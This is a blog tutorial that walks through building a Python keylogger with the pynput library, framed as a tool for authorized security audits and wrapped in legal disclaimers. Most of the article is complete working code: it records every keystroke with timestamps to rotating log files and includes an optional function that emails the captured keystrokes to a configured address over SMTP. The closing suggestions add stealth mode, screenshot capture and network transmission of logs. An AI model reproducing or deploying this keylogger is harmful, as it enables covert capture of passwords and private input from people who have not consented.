---
title: "Creating an Keylogger for Authorized Security Audits."
date: 2025-03-05 12:02:00 +0300
categories: [Scripts, Python]
tags: [keylogger, security-audit, python, ethical-hacking]
description: "A step-by-step guide to building a Python keylogger for authorized security audits, covering log rotation, rotating file handlers, and professional logging practices."
image:
  path: /assets/images/keylogger-banner.webp
  alt: Keylogger Security Banner
---
Hello everyone,

I hope you're doing well and having a great day.

In today's article, we'll explore a project that demonstrates how user input can be monitored and logged in controlled environments for educational purposes and authorized security assessments.

Understanding how keylogging mechanisms work is valuable for security professionals because it helps explain a common technique frequently encountered during malware analysis, incident response investigations, security awareness programs, and defensive security research. By understanding how these tools operate, defenders can better identify, detect, and mitigate similar threats in real-world environments.

The purpose of this project is not to promote unauthorized monitoring, but rather to examine the technical concepts behind keyboard event handling, logging mechanisms, and application design within a controlled and authorized context.

In this article, we'll build the project step by step, review the source code, and discuss the security considerations associated with this type of software.

Let's get started.

**LEGAL DISCLAIMER:** This article is for educational purposes only. The code and techniques discussed here should only be used on systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.

## Introduction

As a security professional at my company, I was tasked with building an internal monitoring tool for authorized security audits. With proper written permission from management, I developed an enterprise-grade keylogger that captures keystrokes for legitimate security testing purposes.
In this tutorial, I will walk you through building a professional keylogger with features like:

- Log rotation
- Email reporting
- Special key handling
- Professional logging format

## Prerequisites

Before you start coding, you will need:

- Python 3.6 or higher
- Basic Python knowledge
- A code editor (VS Code, PyCharm, etc.)
- Written authorization if testing on any system

```bash
pip install pynput
```

## Project Structure

```
Keylogger-Project/
│
├── keylogger.py
├── logs/
│   └── (log files will go here)
└── README.md
```

![Project Structure](/assets/images/posts/project-structure.png)

## Building the Keylogger

Let us break down the code into manageable sections:

### 1. Import Required Libraries

```python
from pynput import keyboard
import logging
import os
from datetime import datetime
from logging.handlers import RotatingFileHandler
```

### 2. Create the Main Class

```python
class EnterpriseKeylogger:
    def __init__(self, log_file="audit_log.txt", email_config=None):
        self.log_file = log_file
        self.email_config = email_config
        self.buffer = []
        self.buffer_size = 50
        self.setup_logging()
```

### 3. Setup Professional Logging

```python
def setup_logging(self):
    # Create directory if it does not exist
    log_dir = os.path.dirname(self.log_file)
    if log_dir and not os.path.exists(log_dir):
        os.makedirs(log_dir)
        print(f"[INFO] Created log directory: {log_dir}")

    self.logger = logging.getLogger('SecurityAudit')
    self.logger.setLevel(logging.INFO)

    # Rotating file handler (10MB per file)
    handler = RotatingFileHandler(
        self.log_file, maxBytes=10*1024*1024, backupCount=5
    )

    formatter = logging.Formatter(
        '%(asctime)s | %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

    handler.setFormatter(formatter)
    self.logger.addHandler(handler)
```

### 4. Handle Key Presses

```python
def on_key_press(self, key):
    try:
        # Regular characters
        if hasattr(key, 'char') and key.char is not None:
            keystroke = key.char
            self.logger.info(f'{keystroke}')
            self.buffer.append(keystroke)

        # Special keys
        else:
            special_keys = {
                keyboard.Key.space: 'SPACE',
                keyboard.Key.enter: 'ENTER',
                keyboard.Key.tab: 'TAB',
                keyboard.Key.backspace: 'BACKSPACE',
                keyboard.Key.delete: 'DELETE',
                keyboard.Key.shift: 'SHIFT',
                keyboard.Key.ctrl: 'CTRL',
                keyboard.Key.alt: 'ALT',
                keyboard.Key.esc: 'ESC'
            }
            key_name = special_keys.get(key, str(key))
            self.logger.info(f'[{key_name}]')
            self.buffer.append(f'[{key_name}]')

    except Exception as e:
        self.logger.error(f'Error: {str(e)}')
```

### 5. Add Email Reporting (Optional)

```python
def send_logs_email(self):
    if not self.email_config or not self.buffer:
        return

    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart

        msg = MIMEMultipart()
        msg['From'] = self.email_config['from']
        msg['To'] = self.email_config['to']
        msg['Subject'] = f"Logs - {datetime.now()}"

        body = '\n'.join(self.buffer)
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP(
            self.email_config['smtp_server'], 
            self.email_config['smtp_port']
        )
        server.starttls()
        server.login(
            self.email_config['username'], 
            self.email_config['password']
        )
        server.send_message(msg)
        server.quit()

        self.buffer.clear()
        self.logger.info('Email sent')

    except Exception as e:
        self.logger.error(f'Email error: {str(e)}')
```

### 6. Start and Stop Methods

```python
def start_monitoring(self):
    self.logger.info('Monitoring started')
    print(f"\n[+] Keylogger running. Logging to: {self.log_file}")
    print("[+] Press Ctrl+C to stop\n")

    with keyboard.Listener(on_press=self.on_key_press) as listener:
        listener.join()

def stop_monitoring(self):
    self.logger.info('Monitoring stopped')
    print("\n[+] Keylogger stopped")
```

### 7. Main Execution

```python
if __name__ == "__main__":
    # Configuration
    keylogger = EnterpriseKeylogger(
        log_file="logs/security_audit.log",
        email_config=None  # Set to None if no email needed
    )

    try:
        keylogger.start_monitoring()
    except KeyboardInterrupt:
        keylogger.stop_monitoring()
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
        keylogger.stop_monitoring()
```

## Complete Code

Here is the entire working code:

```python
from pynput import keyboard
import logging
import os
from datetime import datetime
from logging.handlers import RotatingFileHandler

class EnterpriseKeylogger:
    def __init__(self, log_file="logs/security_audit.log", email_config=None):
        self.log_file = log_file
        self.email_config = email_config
        self.buffer = []
        self.buffer_size = 50
        self.setup_logging()

    def setup_logging(self):
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir)

        self.logger = logging.getLogger('SecurityAudit')
        self.logger.setLevel(logging.INFO)

        if self.logger.hasHandlers():
            self.logger.handlers.clear()

        handler = RotatingFileHandler(
            self.log_file, maxBytes=10*1024*1024, backupCount=5
        )

        formatter = logging.Formatter(
            '%(asctime)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

        handler.setFormatter(formatter)
        self.logger.addHandler(handler)

        # Console output
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        console.setFormatter(formatter)
        self.logger.addHandler(console)

    def on_key_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.logger.info(f'{key.char}')
                self.buffer.append(key.char)
            else:
                special_keys = {
                    keyboard.Key.space: 'SPACE',
                    keyboard.Key.enter: 'ENTER',
                    keyboard.Key.tab: 'TAB',
                    keyboard.Key.backspace: 'BACKSPACE',
                    keyboard.Key.delete: 'DELETE',
                    keyboard.Key.shift: 'SHIFT',
                    keyboard.Key.ctrl: 'CTRL',
                    keyboard.Key.alt: 'ALT',
                    keyboard.Key.esc: 'ESC'
                }
                key_name = special_keys.get(key, str(key))
                self.logger.info(f'[{key_name}]')
                self.buffer.append(f'[{key_name}]')
        except Exception as e:
            self.logger.error(f'Error: {e}')

    def start_monitoring(self):
        self.logger.info('='*50)
        self.logger.info('KEYLOGGER STARTED')
        self.logger.info('='*50)
        print(f"\n[+] Monitoring started. Log file: {self.log_file}")
        print("[+] Press Ctrl+C to stop\n")

        with keyboard.Listener(on_press=self.on_key_press) as listener:
            listener.join()

    def stop_monitoring(self):
        self.logger.info('='*50)
        self.logger.info('KEYLOGGER STOPPED')
        self.logger.info('='*50)
        print("\n[+] Monitoring stopped")

if __name__ == "__main__":
    keylogger = EnterpriseKeylogger("logs/audit.log")

    try:
        keylogger.start_monitoring()
    except KeyboardInterrupt:
        keylogger.stop_monitoring()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        keylogger.stop_monitoring()
```

![Running](/assets/images/posts/keylogger-running.png)

## Testing Your Keylogger

1. Save the code as `keylogger.py`
2. Create a `logs` folder in the same directory
3. Run it:

```bash
python keylogger.py
```

4. Start typing — you will see keystrokes appearing in the console
5. Check the log file in the `logs` folder
6. Press `Ctrl+C` to stop

![Logs](/assets/images/posts/log-file-output.png)

The log file records each keystroke along with the exact timestamp, allowing analysis of user input behavior and key events such as special keys (`SHIFT`, `WIN`, `ENTER`, `ESC`).




## Important Legal Notes

- This tool is for authorized security testing only
- Using it without permission is illegal in most countries
- You could face:
  - Criminal charges
  - Civil lawsuits
  - Termination from employment
  - Permanent criminal record

**Always get written permission first.**


## Next Steps

Want to enhance this project? Try adding:

- Screenshot capture every few minutes
- Encryption for log files
- Stealth mode (hide console)
- USB key detection for physical security testing
- Network transmission of logs (with encryption)

## Conclusion

Projects like this provide an excellent opportunity to understand how keyboard monitoring software works behind the scenes and why such techniques are commonly analyzed within cybersecurity.

Beyond the code itself, the most important lesson is understanding the balance between technical capability and ethical responsibility. The same concepts that can be used for legitimate security testing and research can also be misused if deployed without authorization. This is why legal approval, transparency, and proper scope definition are essential parts of any security assessment.

For security professionals, studying these mechanisms helps improve malware analysis skills, detection capabilities, defensive monitoring strategies, and overall understanding of endpoint security threats.

Thank you for taking the time to read this article.

I hope you found it useful and gained a better understanding of how keyboard event monitoring works from a technical perspective.

Until the next article, stay curious and keep learning.

— Abdulrahman Mohamed

---

## Resources

* [pynput Documentation](https://pynput.readthedocs.io/)
* [Python Logging Guide](https://docs.python.org/3/howto/logging.html)

## Let's Connect

Have a question, suggestion, or topic you'd like to discuss?

* [LinkedIn](https://www.linkedin.com/in/3bdo-fathi) · [Contact Page](/contact-me/)

*Abdulrahman M. Fathi*